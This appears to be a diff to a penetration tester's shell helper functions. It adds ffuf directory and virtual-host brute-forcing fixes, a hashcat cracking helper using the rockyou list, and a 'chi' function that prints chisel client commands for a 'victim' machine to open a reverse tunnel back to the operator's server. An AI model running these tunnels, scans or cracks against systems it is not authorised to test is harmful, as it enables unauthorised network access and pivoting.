@@ -60,6 +60,20 @@ interfaceip() {
   echo "$address"
 }
 
+getopenport() {
+  from="$1"
+  [ "$1" = "" ] && from="11111"
+  to="$2"
+  [ "$2" = "" ] && to="65535"
+  listing_port="$(ss -tnlH4 | awk '{split($4,a,":"); print a[2]}')"
+  seq "$from" "$to" | shuf | while read -r port; do
+    if ! echo "$listing_port" | grep -xqE "^${port}\$"; then
+      echo "$port" && return
+    fi
+  done
+  echo "No open port found"
+}
+
 # Download from CUrrent dir
 dcu() {
   [ "$1" = "" ] && echo "Usage: dcu <win/lin> <port>" && return
@@ -95,7 +109,7 @@ dcu() {
 dcus() {
   plattform="$(echo 'win\nlin' | fzf --prompt="Select plattform")"
   [ "$plattform" = "" ] && echo "Please specify Plattform." && return
-  sel="$(dl_curr "$plattform" "$1" | fzf)"
+  sel="$(dcu "$plattform" "$1" | fzf)"
   echo "Selected and copied to clipboard:"
   echo "$sel"
   echo "$sel" | xclip -selection clipboard
@@ -160,7 +174,7 @@ ffw() {
   echo "Executing and copied to clipboard:"
   echo "ffuf -c -u \"${proto}://${ressource}:${port}/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -o '$ffuf_out/summary.json' -recursion -e '.htm,.py,.sh,.php,.txt,.md,.html,.asp,.aspx,.jsp' -od '$ffuf_out' -mc '200,204,301,302,307,401,405,403' -H \"Host: ${ressource}\" $@"
   echo "ffuf -c -u \"${proto}://${ressource}:${port}/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -o '$ffuf_out/summary.json' -recursion -e '.htm,.py,.sh,.php,.txt,.md,.html,.asp,.aspx,.jsp' -od '$ffuf_out' -mc '200,204,301,302,307,401,405,403' -H \"Host: ${ressource}\" $@" | xclip -selection clipboard 
-  ffuf -c -u "${proto}://${ressource}:${port}/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -o "'$ffuf_out/summary.json'" -recursion -e '.htm,.py,.sh,.php,.txt,.md,.html,.asp,.aspx,.jsp' -od "'$ffuf_out'" -mc '200,204,301,302,307,401,405,403' -H "Host: ${ressource}" $@
+  ffuf -c -u "${proto}://${ressource}:${port}/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -o "$ffuf_out/summary.json" -recursion -e '.htm,.py,.sh,.php,.txt,.md,.html,.asp,.aspx,.jsp' -od "$ffuf_out" -mc '200,204,301,302,307,401,405,403' -H "Host: ${ressource}" $@
 }
 
 # FFuf Vhost bruteforce
@@ -176,7 +190,7 @@ ffv() {
   echo "Executing and copied to clipboard:"
   echo "ffuf -c -u \"${proto}://${ressource}:${port}\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o '$ffuf_out/summary.json' -od '$ffuf_out' -H \"Host: FUZZ.${ressource}\" -fs ${filter_size} $@"
   echo "ffuf -c -u \"${proto}://${ressource}:${port}\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o '$ffuf_out/summary.json' -od '$ffuf_out' -H \"Host: FUZZ.${ressource}\" -fs ${filter_size} $@" | xclip -selection clipboard
-  ffuf -c -u "${proto}://${ressource}:${port}" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o "'$ffuf_out/summary.json'" -od "'$ffuf_out'" -H "Host: FUZZ.${ressource}" -fs ${filter_size} $@
+  ffuf -c -u "${proto}://${ressource}:${port}" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o "'$ffuf_out/summary.json'" -od "$ffuf_out" -H "Host: FUZZ.${ressource}" -fs ${filter_size} $@
 }
 
 vnc_start() {
@@ -262,3 +276,42 @@ shb() {
   echo "$selection" | xclip -selection clipboard
 }
 
+# CHIsel connection
+chi() {
+  [ "$1" == "" ] && echo "Usage: chi <port from victim>" && return
+  rport="$1"
+  lhost_port="9999"
+  address="$(interfaceip)"
+  free_port="$(getopenport)"
+  echo "####### Setup #######"
+  echo "mkdir -p www && cd www && cef && dcus"
+  echo ""
+  echo "####### Start chisel client on windows #######"
+  echo "chisel_win64.exe client ${address}:${lhost_port} R:${rport}:localhost:${free_port}"
+  echo ""
+  echo "####### Start chisel client on linux #######"
+  echo "chmod +x chisel_linux64 && ./chisel_linux64 client ${address}:${lhost_port} R:${rport}:localhost:${free_port}"
+  echo ""
+  if ! pgrep "chisel" > /dev/null ; then
+    echo "####### Starting server... #######"
+    chisel server -p "${lhost_port}" --host 0.0.0.0 --reverse
+  else
+    echo "####### Server already running... #######"
+  fi
+}
+
+# Python Virtual Env
+pve() {
+  [ "$1" == "" ] && echo "Usage: pve <virtual env name>" && return
+  python3 -m venv "$1"
+  source "$1/bin/activate"
+  echo 'Run "deactivate" to exit virtual env'
+}
+
+# CRack Hash
+cra() {
+  [ "$1" == "" ] && echo "Usage: cha <path to file with hash>" && return
+  nth --no-banner --file "$1"
+  echo "Crack with hashcat:"
+  echo "hashcat \"$1\" /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt"
+}
